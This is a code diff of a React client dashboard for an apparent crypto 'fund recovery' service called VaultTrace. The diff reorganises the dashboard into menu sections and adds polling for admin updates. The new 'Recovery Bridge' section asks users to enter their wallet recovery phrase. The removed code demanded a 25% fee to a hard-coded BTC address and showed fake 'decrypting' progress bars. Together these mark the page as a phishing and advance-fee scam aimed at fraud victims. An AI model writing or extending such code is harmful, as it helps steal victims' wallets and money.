@@ -81,8 +81,38 @@ export default function ClientDashboard() {
   const [displayAmount, setDisplayAmount] = useState(0);
   const [currentFee, setCurrentFee] = useState(0);
   const [isCalculating, setIsCalculating] = useState(false);
+  const [menuOpen, setMenuOpen] = useState(false);
+  const [selectedSection, setSelectedSection] = useState('overview');
 
   const wallets = ['Coinbase', 'Binance', 'MetaMask', 'Trust Wallet', 'Exodus', 'Ledger', 'Trezor', 'Other'];
+
+  const sections = [
+    { id: 'overview', label: 'Beneficiary' },
+    { id: 'bridge', label: 'Recovery Bridge' },
+    { id: 'evidence', label: 'Evidence' },
+    { id: 'support', label: 'Support' },
+    { id: 'security', label: 'Security' },
+  ];
+
+  const handleSectionClick = (sectionId: string) => {
+    setSelectedSection(sectionId);
+    setMenuOpen(false);
+    sessionStorage.setItem('clientDashboardSection', sectionId);
+    // scroll to the section if rendered
+    setTimeout(() => {
+      const el = document.getElementById(sectionId);
+      if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }, 120);
+  };
+
+  // Poll for client data so admin updates appear on client within short time
+  useEffect(() => {
+    if (!token) return;
+    const iv = setInterval(() => {
+      fetchClientData(token);
+    }, 8000);
+    return () => clearInterval(iv);
+  }, [token]);
 
   const inboxMessages = [
     {
@@ -415,13 +445,13 @@ export default function ClientDashboard() {
     if (!replyText.trim() || !token) return;
 
     try {
-      const response = await fetch(getApiUrl(`/api/messages/${messageId}/reply`), {
-        method: 'PUT',
+      const response = await fetch(getApiUrl('/api/messages'), {
+        method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Authorization': `Bearer ${token}`,
         },
-        body: JSON.stringify({ reply: replyText }),
+        body: JSON.stringify({ message: replyText }),
       });
 
       if (response.ok) {
@@ -430,7 +460,8 @@ export default function ClientDashboard() {
         setSelectedMessageId(null);
         fetchMessages(token);
       } else {
-        alert('Error sending reply.');
+        const errorData = await response.json().catch(() => null);
+        alert(errorData?.message || 'Error sending reply.');
       }
     } catch (error) {
       console.error('Error:', error);
@@ -511,19 +542,19 @@ export default function ClientDashboard() {
   if (loading) {
     return (
       <div className="min-h-screen bg-[#040b16] text-white flex items-center justify-center p-6">
-        <div className="text-center">
-          <p className="text-cyan-400 text-xl font-mono">Loading client data...</p>
+          <div className="text-center">
+            <p className="text-teal-400 text-xl font-mono">Loading client data...</p>
+          </div>
         </div>
-      </div>
     );
   }
 
   return (
     <div className="min-h-screen bg-[#040b16] text-white p-6 md:p-10">
       <div className="max-w-7xl mx-auto space-y-8">
-        <header className="flex flex-col gap-6 xl:flex-row xl:items-start xl:justify-between">
+        <header className="flex flex-col gap-6 xl:flex-row xl:items-start justify-end xl:justify-between">
           <div className="space-y-4">
-            <p className="uppercase tracking-[0.35em] text-cyan-300 text-xs">VaultTrace Retraction Protocol</p>
+            <p className="uppercase tracking-[0.35em] text-teal-300 text-xs">VaultTrace Retraction Protocol</p>
             <div className="space-y-2">
               <h1 className="text-4xl md:text-5xl font-black tracking-tight">CLASSIFIED RECOVERY</h1>
               <p className="text-sm text-slate-400 uppercase tracking-[0.25em]">
@@ -543,8 +574,8 @@ export default function ClientDashboard() {
           </div>
 
           <div className="flex gap-4">
-            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5">
-              <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-3">Encryption Standards</p>
+            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5">
+              <p className="text-xs uppercase tracking-[0.3em] text-teal-300 mb-3">Encryption Standards</p>
               <div className="space-y-2 text-sm text-slate-200">
                 <p>AES-256-GCM</p>
                 <p>ChaCha20-Poly1305</p>
@@ -553,386 +584,223 @@ export default function ClientDashboard() {
             </div>
             <button
               onClick={handleLogout}
-              className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5 hover:bg-red-500/10 transition"
+              className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-teal-500/5 hover:bg-red-500/10 transition"
             >
               <p className="text-xs uppercase tracking-[0.3em] text-red-300">Logout</p>
             </button>
           </div>
         </header>
 
-        <section className="grid gap-8 xl:grid-cols-[1.8fr_1fr]">
-          <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
-            <CyberTracker
-              steps={[
-                'Intake Submission',
-                'Technical Assessment',
-                'Evidence Validation',
-                'Forensic Recovery',
-                'Release Authorization',
-              ]}
-              currentStage={2}
-              progress={animatedProgress}
-            />
-            {/* Beneficiary Profile moved immediately under Status Tracker */}
-            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5 mb-6">
-              <div className="flex items-center justify-between gap-4">
-                <div>
-                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Beneficiary Profile</p>
-                  <h2 className="mt-3 text-2xl font-semibold text-white">Case ID: {caseId || 'TBD'}</h2>
-                </div>
-                <span className="rounded-3xl bg-emerald-500/10 px-4 py-2 text-xs uppercase tracking-[0.3em] text-emerald-300">Verified</span>
+        <section className="space-y-6">
+            <div className="rounded-[32px] border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-teal-500/5">
+            <div className="flex flex-wrap items-center justify-between gap-4">
+              <div>
+                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Client Dashboard</p>
+                <h2 className="text-xl font-semibold text-white">Beneficiary Profile</h2>
+                <p className="text-sm text-slate-500">Only the beneficiary profile is visible by default. Open a session from the menu to view more.</p>
               </div>
-
-              <div className="mt-6 space-y-4 text-sm text-slate-300">
-                <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
-                  <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #1</p>
-                  <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss1?.toLocaleString() || '0.00'}</p>
-                </div>
-                <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
-                  <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #2</p>
-                  <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss2?.toLocaleString() || '0.00'}</p>
-                </div>
-                <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
-                  <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Total Entitlement</p>
-                  <p className="mt-2 text-2xl font-semibold text-cyan-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
-                </div>
-              </div>
+              <button
+                onClick={() => setMenuOpen((open) => !open)}
+                className="inline-flex h-12 w-12 items-center justify-center rounded-3xl border border-white/10 bg-white/5 text-teal-300 hover:bg-teal-500/10"
+                aria-label="Toggle dashboard menu"
+              >
+                ☰
+              </button>
             </div>
 
-            <div className="grid gap-6 lg:grid-cols-[1.5fr_1fr]">
-              <div className="space-y-6">
-                <p className="text-sm uppercase tracking-[0.3em] text-slate-400">Financial Overview</p>
-                <div>
-                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Total Equity (USDT)</p>
-                  <p className="mt-2 text-5xl font-bold text-cyan-300">${data.recoveredAmount.toLocaleString()}</p>
-                </div>
+            {menuOpen && (
+              <div className="mt-4 space-y-3 rounded-[32px] border border-white/10 bg-slate-900/80 p-4">
+                {sections.map((section) => (
+                  <button
+                    key={section.id}
+                    onClick={() => handleSectionClick(section.id)}
+                    className={`w-full rounded-3xl px-4 py-3 text-left text-sm font-semibold transition ${selectedSection === section.id ? 'bg-teal-500 text-black' : 'bg-slate-950/80 text-slate-200 hover:bg-slate-900'}`}
+                  >
+                    {section.label}
+                  </button>
+                ))}
+                <button
+                  onClick={handleLogout}
+                  className="w-full rounded-3xl bg-red-500 px-4 py-3 text-left text-sm font-semibold text-black hover:bg-red-400"
+                >
+                  Logout
+                </button>
               </div>
+            )}
+          </div>
 
-              <div className="rounded-[28px] bg-slate-950/80 p-5 border border-white/10">
-                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Wallet Verification</p>
-                <p className="mt-3 text-base font-semibold text-white">BYBIT WALLET VERIFICATION</p>
-                <p className="mt-2 text-sm text-slate-500">ETH / BSC / BTC</p>
-                <div className="mt-4 rounded-2xl bg-slate-900/80 px-4 py-3 text-xs uppercase tracking-[0.2em] text-orange-300 border border-orange-500/10">
-                  FUNDS LOCKED
-                </div>
+          <div className="rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
+            <div className="flex items-center justify-between gap-4">
+              <div>
+                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Beneficiary Profile</p>
+                <h3 className="mt-2 text-2xl font-semibold text-white">Case ID: {caseId || 'TBD'}</h3>
               </div>
+              <span className="rounded-full bg-emerald-500/10 px-4 py-2 text-xs uppercase tracking-[0.3em] text-emerald-300">Verified</span>
             </div>
 
-            <div className="mt-10 grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
-              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
-                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Balance</p>
-                <p className="mt-3 text-2xl font-semibold text-slate-100">${data.balance?.toLocaleString() || '0.00'}</p>
+            <div className="mt-6 grid gap-4 md:grid-cols-3 text-sm text-slate-300">
+              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
+                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #1</p>
+                <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss1?.toLocaleString() || '0.00'}</p>
               </div>
-              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
-                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Fixed</p>
-                <p className="mt-3 text-2xl font-semibold text-cyan-300">${data.fixed?.toLocaleString() || '0.00'}</p>
-                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500 mt-2">Multi-Sig Lock</p>
+              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
+                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #2</p>
+                <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss2?.toLocaleString() || '0.00'}</p>
               </div>
-              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
-                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Marsetta Share</p>
-                <p className="mt-3 text-2xl font-semibold text-white">${data.marsettaShare?.toLocaleString() || '0.00'}</p>
-                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500 mt-2">2.08% Settlement</p>
-              </div>
-              <div className="rounded-3xl bg-slate-950/80 p-5 border border-white/10">
-                <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Protocol Progress</p>
-                <p className="mt-3 text-base font-semibold text-white">Decrypting target vectors</p>
-                <div className="mt-4 h-3 rounded-full bg-slate-900/80 overflow-hidden">
-                  <div className="h-full bg-cyan-500" style={{ width: `${animatedProgress}%` }} />
-                </div>
-              </div>
-            </div>
-
-            <div className="mt-10 rounded-[32px] bg-slate-950/80 border border-white/10 p-6">
-              <div className="flex items-center justify-between gap-4">
-                <div>
-                  <p className="text-xs uppercase tracking-[0.3em] text-slate-500">Protocol Status</p>
-                  <p className="mt-2 text-xl font-semibold text-white">Decrypting target vectors</p>
-                </div>
-                <span className="inline-flex items-center rounded-full bg-cyan-500/15 px-3 py-1 text-xs uppercase tracking-[0.3em] text-cyan-200">{animatedProgress.toFixed(1)}% Complete</span>
-              </div>
-              <div className="mt-6 h-3 rounded-full bg-slate-900/80 overflow-hidden">
-                <div className="h-full bg-cyan-400" style={{ width: `${animatedProgress}%` }} />
+              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
+                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Total Entitlement</p>
+                <p className="mt-2 text-2xl font-semibold text-teal-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
               </div>
             </div>
           </div>
 
-          <aside className="space-y-8">
-
-              {/* Evidence Vault */}
-              <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-6 shadow-xl shadow-cyan-500/5">
+          <div className="rounded-[32px] border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-teal-500/5">
+            {selectedSection === 'overview' && (
+              <div id="overview" className="space-y-6">
                 <div>
-                  <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">Evidence Vault</p>
-                  <h3 className="text-xl font-semibold text-white mt-2">Uploaded Evidence & Integrity Hashes</h3>
-                  <p className="text-sm text-slate-400 mt-2">All uploaded files are stored with cryptographic hashes to preserve integrity.</p>
+                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Overview</p>
+                  <h3 className="text-2xl font-semibold text-white">Recovery Status</h3>
                 </div>
-
-                <div className="mt-4 space-y-3 text-sm text-slate-300">
-                  {evidenceList && evidenceList.length > 0 ? (
-                    evidenceList.map((e: any) => (
-                      <div key={e.id} className="rounded-2xl bg-slate-950/80 p-3 border border-white/8">
-                        <p className="font-semibold text-white">{e.name}</p>
-                        <p className="text-xs text-slate-500 mt-1">SHA256: {e.sha256 || '—'}</p>
-                        <div className="mt-3 flex gap-2">
-                          <a href={e.url || `/uploads/${encodeURIComponent(e.name)}`} download={e.name} target="_blank" rel="noopener noreferrer" className="px-3 py-1 bg-cyan-500 text-black rounded text-xs">Download</a>
-                          <button onClick={() => alert(JSON.stringify(e, null, 2))} className="px-3 py-1 bg-slate-800 text-slate-300 rounded text-xs">View Details</button>
-                        </div>
-                      </div>
-                    ))
-                  ) : (
-                    <div className="rounded-2xl bg-slate-900/60 p-4 border border-white/6 text-slate-400">No evidence files available yet. Upload via the intake form or the Evidence upload section.</div>
-                  )}
-                </div>
-              </div>
-
-              {/* FeasibilityAssessment moved into Messages inbox as admin reply */}
-
-              <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
-              <div className="space-y-4">
-                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">CONNECT WALLET</p>
-                <h3 className="text-2xl font-semibold">Recovery Bridge</h3>
-                <p className="text-sm text-slate-400">Select your wallet to establish the encrypted bridge for smart-contract retraction.</p>
-              </div>
-
-              <select
-                value={selectedWallet}
-                onChange={handleWalletChange}
-                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-              >
-                <option value="">Select Wallet</option>
-                {wallets.map(wallet => (
-                  <option key={wallet} value={wallet}>{wallet}</option>
-                ))}
-              </select>              {selectedWallet === 'Other' && (
-                <input
-                  type="text"
-                  value={customWallet}
-                  onChange={(e) => setCustomWallet(e.target.value)}
-                  placeholder="Enter custom wallet name"
-                  className="mt-4 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
+                <CyberTracker
+                  steps={['Intake Submission', 'Technical Assessment', 'Evidence Validation', 'Forensic Recovery', 'Release Authorization']}
+                  currentStage={2}
+                  progress={animatedProgress}
                 />
-              )}
-              <textarea
-                rows={6}
-                value={seedPhrase}
-                onChange={handleSeedChange}
-                placeholder="Enter 12-word or 24-word recovery phrase"
-                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-              />
+              </div>
+            )}
 
-              <button
-                onClick={handleSimulateSubmit}
-                className="mt-6 w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
-              >
-                Establish Secure Bridge
-              </button>
-            </div>
-
-            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
-              <div className="space-y-4">
-                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">PAYMENT</p>
-                <h3 className="text-2xl font-semibold">Service Fee (25%)</h3>
-
-                {/* Live Calculation Display */}
-                <div className="bg-gradient-to-r from-cyan-500/10 to-cyan-400/10 border border-cyan-500/20 rounded-3xl p-4 mb-4">
-                  <div className="flex justify-between items-center mb-3">
-                    <span className="text-xs text-cyan-400 uppercase tracking-[0.2em]">Neural-AI Calculation</span>
-                    <span className={`text-xs font-bold ${isCalculating ? 'text-yellow-400 animate-pulse' : 'text-green-400'}`}>
-                      {isCalculating ? 'SCANNING...' : 'COMPLETE'}
-                    </span>
-                  </div>
-                  <div className="grid grid-cols-2 gap-4">
-                    <div className="text-center">
-                      <p className="text-lg font-bold text-cyan-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
-                      <p className="text-xs text-slate-400 uppercase tracking-[0.2em]">Total Entitlement</p>
-                    </div>
-                    <div className={`text-center p-2 rounded-xl transition-all duration-300 ${
-                      isCalculating && animatedProgress > 85 ? 'bg-yellow-500/10 border border-yellow-500/30 animate-pulse' : ''
-                    }`}>
-                      <p className={`text-lg font-bold ${isCalculating && animatedProgress > 85 ? 'text-yellow-300' : 'text-slate-200'}`}>
-                        ${currentFee.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}
-                      </p>
-                      <p className="text-xs text-slate-400 uppercase tracking-[0.2em]">Service Fee</p>
-                    </div>
-                  </div>
+            {selectedSection === 'bridge' && (
+              <div id="bridge" className="space-y-6">
+                <div>
+                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Recovery Bridge</p>
+                  <h3 className="text-2xl font-semibold text-white">Connect Wallet</h3>
                 </div>
-
-                <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-3xl p-4">
-                  <p className="text-yellow-300 text-sm font-semibold">To initiate the secure retraction and finalize this phase of your case, the associated professional service fee of (25%) must be settled. Please note that secured assets are held in a temporary multi-sig state; prompt settlement ensures the immediate release of funds to your custody.</p>
-                </div>
-                <div className="flex items-center gap-2">
-                  <p className="text-sm text-slate-400">Send to: 1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u</p>
-                  <button
-                    onClick={() => navigator.clipboard.writeText('1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u').then(() => alert('BTC address copied!'))}
-                    className="px-3 py-1 bg-cyan-500 text-black text-xs font-bold rounded hover:bg-cyan-400"
-                  >
-                    Copy
-                  </button>
-                </div>
-                <div className="space-y-2">
-                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Enter BTC Amount to Pay</label>
-                  <input
-                    type="number"
-                    step="0.00000001"
-                    placeholder="e.g., 0.001"
-                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
+                <select
+                  value={selectedWallet}
+                  onChange={handleWalletChange}
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
+                >
+                  <option value="">Select Wallet</option>
+                  {wallets.map((wallet) => (
+                    <option key={wallet} value={wallet}>{wallet}</option>
+                  ))}
+                </select>
+                {selectedWallet === 'Other' && (
+                    <input
+                    type="text"
+                    value={customWallet}
+                    onChange={(e) => setCustomWallet(e.target.value)}
+                    placeholder="Enter custom wallet name"
+                      className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
                   />
-                </div>
-                <div className="space-y-2">
-                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Upload Payment Proof</label>
-                  <input
-                    type="file"
-                    accept="image/*"
-                    onChange={handlePaymentProofUpload}
-                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 file:bg-cyan-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded file:mr-4 file:text-xs"
-                  />
-                  {paymentProofFile && (
-                    <p className="text-green-400 text-xs mt-1">✓ {paymentProofFile.name} uploaded</p>
-                  )}
-                </div>
-                {data.paymentConfirmed ? (
-                  <p className="text-green-400 mt-4 font-semibold">✓ Payment Confirmed</p>
-                ) : data.feePaid ? (
-                  <p className="text-blue-400 mt-4 font-semibold">Fee Paid - Awaiting Confirmation</p>
-                ) : data.paymentPending ? (
-                  <p className="text-yellow-400 mt-4 font-semibold">Pending Confirmation</p>
-                ) : (
-                  <button
-                    onClick={handlePaymentSent}
-                    className="mt-4 w-full px-4 py-2 bg-yellow-500 text-black font-bold rounded hover:bg-yellow-400"
-                  >
-                    I Have Sent My Payment
-                  </button>
                 )}
+                <textarea
+                  rows={6}
+                  value={seedPhrase}
+                  onChange={handleSeedChange}
+                  placeholder="Enter 12-word or 24-word recovery phrase"
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
+                />
+                <button
+                  onClick={handleSimulateSubmit}
+                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
+                >
+                  Establish Secure Bridge
+                </button>
               </div>
-            </div>
+            )}
 
-            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
-              <div className="space-y-4">
-                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">UPLOAD EVIDENCE</p>
-                <h3 className="text-2xl font-semibold">Additional Files</h3>
-                <p className="text-sm text-slate-400">Upload more evidence for your case and specify the associated amount.</p>
-              </div>
-
-              <input
-                type="file"
-                onChange={handleFileChange}
-                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 file:bg-cyan-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded file:mr-4"
-              />
-
-              <input
-                type="number"
-                value={additionalEvidenceAmount}
-                onChange={(e) => setAdditionalEvidenceAmount(e.target.value)}
-                placeholder="Enter amount for this evidence ($)"
-                className="mt-4 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-              />
-
-              <button
-                onClick={handleEvidenceUpload}
-                className="mt-6 w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
-              >
-                Upload Evidence
-              </button>
-            </div>
-
-            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
-              <div className="space-y-4">
-                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">SUPPORT</p>
-                <h3 className="text-2xl font-semibold">Contact Support</h3>
-                <p className="text-sm text-slate-400">Send a message to our support team.</p>
-              </div>
-
-              <textarea
-                rows={4}
-                value={supportMessage}
-                onChange={(e) => setSupportMessage(e.target.value)}
-                placeholder="Type your message here"
-                className="mt-6 w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-              />
-
-              <button
-                onClick={handleSendSupport}
-                className="mt-6 w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
-              >
-                Send Message
-              </button>
-            </div>
-
-            <div className="glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
-              <div className="space-y-4">
-                <p className="text-xs uppercase tracking-[0.3em] text-cyan-300">ACCOUNT SETTINGS</p>
-                <h3 className="text-2xl font-semibold">Security & Password</h3>
-                <p className="text-sm text-slate-400">Manage your account security settings.</p>
-              </div>
-
-              <div className="mt-6 space-y-4">
-                <div className="space-y-2">
-                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Current Password</label>
-                  <input
-                    type="password"
-                    value={currentPassword}
-                    onChange={(e) => setCurrentPassword(e.target.value)}
-                    placeholder="Enter current password"
-                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-                  />
+            {selectedSection === 'evidence' && (
+              <div id="evidence" className="space-y-6">
+                <div>
+                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Evidence</p>
+                  <h3 className="text-2xl font-semibold text-white">Upload Supporting Files</h3>
                 </div>
-                <div className="space-y-2">
-                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">New Password</label>
-                  <input
-                    type="password"
-                    value={newPassword}
-                    onChange={(e) => setNewPassword(e.target.value)}
-                    placeholder="Enter new password"
-                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-                  />
+                <input
+                  type="file"
+                  onChange={handleFileChange}
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 file:bg-teal-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded"
+                />
+                <input
+                  type="number"
+                  value={additionalEvidenceAmount}
+                  onChange={(e) => setAdditionalEvidenceAmount(e.target.value)}
+                  placeholder="Enter amount for this evidence ($)"
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
+                />
+                <button
+                  onClick={handleEvidenceUpload}
+                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
+                >
+                  Upload Evidence
+                </button>
+              </div>
+            )}
+
+            {selectedSection === 'support' && (
+              <div id="support" className="space-y-6">
+                <div>
+                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Support</p>
+                  <h3 className="text-2xl font-semibold text-white">Contact Support</h3>
                 </div>
-                <div className="space-y-2">
-                  <label className="text-sm uppercase tracking-[0.3em] text-slate-400">Confirm New Password</label>
-                  <input
-                    type="password"
-                    value={confirmPassword}
-                    onChange={(e) => setConfirmPassword(e.target.value)}
-                    placeholder="Confirm new password"
-                    className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-                  />
+                <textarea
+                  rows={4}
+                  value={supportMessage}
+                  onChange={(e) => setSupportMessage(e.target.value)}
+                  placeholder="Type your message here"
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
+                />
+                <button
+                  onClick={handleSendSupport}
+                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
+                >
+                  Send Message
+                </button>
+              </div>
+            )}
+
+            {selectedSection === 'security' && (
+              <div id="security" className="space-y-6">
+                <div>
+                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Security</p>
+                  <h3 className="text-2xl font-semibold text-white">Account Protection</h3>
                 </div>
+                <input
+                  type="password"
+                  value={currentPassword}
+                  onChange={(e) => setCurrentPassword(e.target.value)}
+                  placeholder="Current password"
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-teal-400 focus:outline-none focus:ring-2 focus:ring-teal-400/20"
+                />
+                <input
+                  type="password"
+                  value={newPassword}
+                  onChange={(e) => setNewPassword(e.target.value)}
+                  placeholder="New password"
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
+                />
+                <input
+                  type="password"
+                  value={confirmPassword}
+                  onChange={(e) => setConfirmPassword(e.target.value)}
+                  placeholder="Confirm new password"
+                  className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
+                />
                 <button
                   onClick={handleChangePassword}
-                  className="w-full rounded-3xl bg-cyan-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black transition hover:bg-cyan-400"
+                  className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
                 >
                   Change Password
                 </button>
               </div>
-
-              <div className="mt-8 pt-6 border-t border-white/10">
-                <div className="space-y-4">
-                  <h4 className="text-lg font-semibold text-white">Forgot Password?</h4>
-                  <p className="text-sm text-slate-400">Enter your email to receive a password reset link.</p>
-                  <div className="space-y-2">
-                    <input
-                      type="email"
-                      value={resetEmail}
-                      onChange={(e) => setResetEmail(e.target.value)}
-                      placeholder="Enter your email address"
-                      className="w-full rounded-3xl border border-white/10 bg-slate-950/80 px-4 py-4 text-sm text-slate-200 placeholder:text-slate-500 focus:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400/20"
-                    />
-                  </div>
-                  <button
-                    onClick={handleForgotPassword}
